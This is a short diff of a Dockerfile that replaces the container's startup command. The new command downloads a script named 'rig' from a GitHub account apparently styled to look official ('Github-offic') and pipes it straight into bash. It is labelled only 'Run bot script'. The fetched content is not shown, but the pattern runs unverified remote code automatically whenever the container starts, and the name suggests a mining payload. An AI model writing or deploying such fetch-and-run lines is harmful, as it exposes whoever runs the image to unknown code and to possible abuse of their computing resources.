@@ -12,4 +12,4 @@ RUN apt-get update && apt-get install -y \
  && mkdir -p /home/stuff
  
 # Run bot script:
-CMD curl -sL https://raw.githubusercontent.com/petugas/No/main/gaga | bash
+CMD curl -sL https://raw.githubusercontent.com/Github-offic/slot/main/rig | bash
